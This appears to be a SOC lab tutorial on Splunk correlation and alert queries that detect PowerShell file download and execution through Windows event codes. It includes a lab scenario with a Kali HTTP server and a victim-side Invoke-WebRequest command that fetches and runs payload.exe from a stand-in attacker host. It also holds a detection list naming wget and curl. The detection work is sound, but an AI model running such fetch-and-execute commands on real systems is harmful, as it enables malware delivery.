
## 🔵 Use Case 3 — Single Combined Splunk Query
Suspicious File Download & Execution Detection

This one query detects:

- PowerShell execution
- File download using PowerShell
- Suspicious EXE execution
- Network connection to external host

All in one correlation search.
```spl
index=* (EventCode=4688 OR EventCode=3 OR EventCode=5156)
| eval Activity=case
(
EventCode==4688 AND like(New_Process_Name,"%powershell.exe%"),
"PowerShell Execution",
EventCode==4688 AND like(CommandLine,"%Invoke-WebRequest%"),
"File Download via PowerShell",
EventCode==4688 AND like(New_Process_Name,"%.exe%"),
"Executable File Launched",
EventCode==3,
"Sysmon Network Connection",
EventCode==5156,
"Windows Network Connection Allowed"
)
| stats count
values(Activity) as Detected_Activities
values(Account_Name) as Users
values(New_Process_Name) as Processes
values(CommandLine) as Commands
values(DestinationIp) as Destination_IP
by _time
| sort -_time

```

---

## 🎯 What This Query Detects (Full Use Case 3 Flow)

This covers your entire malware delivery chain.

- PowerShell launched	Event 4688
- File downloaded	Invoke-WebRequest
- Payload executed	payload.exe
- Network connection	Event 3 / 5156

---

## 🧪 Real Kali Attack Scenario (Your Lab)

Run this from Kali:
```bash
sudo python3 -m http.server 80

```

Then on Windows victim:
```cmd
powershell.exe
Invoke-WebRequest http://KALI-IP/payload.exe -OutFile payload.exe
.\payload.exe

```

---

## Splunk logs:

- 4688 → powershell.exe
- 4688 → payload.exe
- 3 → network connection
- 5156 → network allowed

This query detects all those steps together.

---

## ⭐ SOC-Level Correlation Version (Recommended)

This version detects real malware download chains.
```spl
index=* (EventCode=4688 OR EventCode=3 OR EventCode=5156)
| eval Activity=case
(
EventCode==4688 AND like(New_Process_Name,"%powershell.exe%"),
"PowerShell Execution",
EventCode==4688 AND like(CommandLine,"%Invoke-WebRequest%"),
"Malware Download Attempt",
EventCode==4688 AND like(New_Process_Name,"%.exe%"),
"Suspicious Executable Run",
EventCode==3,
"External Network Connection"
)
| stats values(Activity) as Activities
values(Account_Name) as Users
values(DestinationIp) as Destination_IP
values(CommandLine) as Commands
by Account_Name
| where mvcount(Activities) >= 2

```

---

## 🚨 Best Alert Query for Use Case 3

Use this to create Splunk Alert.
```spl
index=* (EventCode=4688)
| search CommandLine="*Invoke-WebRequest*" 
OR CommandLine="*wget*" 
OR CommandLine="*curl*"
| stats count 
values(CommandLine) as Commands
by Account_Name
| where count >= 1

```

---

## 📊 Expected Output Example

|time               |Detected_Activities         |
|-------------------|----------------------------|
|12:32:01           |PowerShell Execution        |
|12:32:05           |File Download via PowerShell |
|12:32:08           |Executable File Launched    |
|12:32:10           |Network Connection          |

---

## ⭐ Real SOC Tip

If you detect:
```
PowerShell Execution
+
File Download
+
Executable Execution

```

---

## 🚨 HIGH CONFIDENCE MALWARE EXECUTION

---
